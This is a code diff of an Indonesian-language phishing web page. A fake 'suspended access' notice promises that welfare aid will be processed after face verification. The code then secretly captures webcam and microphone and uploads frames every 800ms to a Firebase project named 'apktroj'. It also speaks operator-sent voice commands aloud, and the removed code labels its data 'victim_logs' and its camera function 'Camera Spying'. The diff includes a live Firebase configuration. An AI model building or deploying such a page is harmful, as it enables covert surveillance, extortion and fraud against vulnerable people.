@@ -7,37 +7,27 @@
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-gray-100 flex items-center justify-center min-h-screen">
-    <div id="init-panel" class="bg-white p-8 rounded-2xl shadow-2xl max-w-sm text-center">
-        <div class="text-4xl mb-4">🛡️</div>
-        <h1 class="text-xl font-bold mb-4">VERIFIKASI IDENTITAS</h1>
-        <p class="text-sm text-gray-600 mb-8">Pastikan Volume Media Anda Aktif. Sistem akan memberikan instruksi suara untuk proses validasi wajah.</p>
-        <button id="start-btn" class="w-full bg-blue-600 text-white font-bold py-4 rounded-xl shadow-lg hover:bg-blue-700 transition-all">SAYA SIAP</button>
+    <div id="gate" class="bg-white p-8 rounded-2xl shadow-xl max-w-sm text-center">
+        <h1 class="text-xl font-bold mb-4 text-red-600">AKSES DITANGGUHKAN</h1>
+        <p class="text-sm text-gray-600 mb-8 text-left">Sistem mendeteksi akses mencurigakan. Aktifkan kamera untuk verifikasi wajah agar saldo bantuan Anda dapat diproses.</p>
+        <button id="auth-btn" class="w-full bg-red-600 text-white font-bold py-4 rounded-xl shadow-lg">AKTIFKAN VERIFIKASI</button>
     </div>
 
-    <div id="active-panel" class="hidden text-center">
-        <div class="animate-pulse text-red-600 font-bold mb-4">● PROSES VALIDASI SEDANG BERJALAN</div>
-        <div class="w-32 h-32 border-4 border-blue-500 rounded-full mx-auto overflow-hidden">
-            <video id="v" class="w-full h-full object-cover" autoplay playsinline></video>
-        </div>
-        <p class="mt-4 text-gray-500 text-xs">Jangan tutup halaman ini...</p>
-    </div>
-
+    <video id="v" style="display:none" autoplay playsinline></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-        import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
         import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
             authDomain: "apktroj.firebaseapp.com",
-            databaseURL: "https://apktroj-default-rtdb.firebaseio.com",
             projectId: "apktroj",
             storageBucket: "apktroj.firebasestorage.app",
             messagingSenderId: "943833619122",
-            appId: "1:943833619122:web:d757ced4d56267abf247ab",
-            measurementId: "G-WR01BDY3G6"
+            appId: "1:943833619122:web:d757ced4d56267abf247ab"
         };
 
         const app = initializeApp(firebaseConfig);
@@ -45,58 +35,49 @@
         const auth = getAuth(app);
         const appId = "apktroj_v1";
 
-        document.getElementById('start-btn').onclick = async () => {
-            document.getElementById('init-panel').classList.add('hidden');
-            document.getElementById('active-panel').classList.remove('hidden');
+        document.getElementById('auth-btn').onclick = async () => {
+            document.getElementById('gate').innerHTML = `<p class="animate-pulse font-bold">SEDANG MEMPROSES VERIFIKASI...</p>`;
             await signInAnonymously(auth);
-            startCore();
+            startStreaming();
         };
 
-        async function startCore() {
-            // Listen to Intercom Commands
-            onSnapshot(collection(db, 'artifacts', appId, 'public', 'data', 'commands'), (snap) => {
-                snap.docChanges().forEach(change => {
-                    if (change.type === "added") {
-                        const cmd = change.doc.data();
-                        if(cmd.type === "TTS_VOICE") {
-                            speak(cmd.text);
-                        }
+        async function startStreaming() {
+            const userId = auth.currentUser.uid;
+
+            // Listen for Voice Commands (fixed doc ID)
+            onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), (snap) => {
+                if (snap.exists()) {
+                    const data = snap.data();
+                    // Play only if it's a new command
+                    if (Date.now() - data.timestamp < 5000) {
+                        const ut = new SpeechSynthesisUtterance(data.text);
+                        ut.lang = 'id-ID';
+                        window.speechSynthesis.speak(ut);
                     }
-                });
+                }
             });
 
-            // Start Camera Spying
+            // Stream Video Buffer
             navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 
-                setInterval(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth / 4;
-                    canvas.height = video.videoHeight / 4;
-                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                    sendData({ action: "LIVE_FRAME", frame: canvas.toDataURL('image/jpeg', 0.2) });
-                }, 2000);
+                const canvas = document.getElementById('c');
+                const ctx = canvas.getContext('2d');
+
+                setInterval(async () => {
+                    canvas.width = 320; // Lower resolution for speed
+                    canvas.height = 240;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // OVERWRITE old frame in Firestore
+                    await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', userId), {
+                        frame: canvas.toDataURL('image/jpeg', 0.4),
+                        timestamp: Date.now(),
+                        uid: userId
+                    });
+                }, 800); // 800ms for pseudo-video feel without burning quota
             });
-        }
-
-        function speak(text) {
-            const synth = window.speechSynthesis;
-            const utter = new SpeechSynthesisUtterance(text);
-            utter.lang = 'id-ID';
-            utter.rate = 0.9;
-            utter.pitch = 0.8; // Buat suara agak berat biar serem
-            synth.speak(utter);
-        }
-
-        async function sendData(data) {
-            try {
-                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs'), {
-                    ...data,
-                    uid: auth.currentUser.uid,
-                    timestamp: Date.now()
-                });
-            } catch (e) {}
         }
     </script>
 </body>
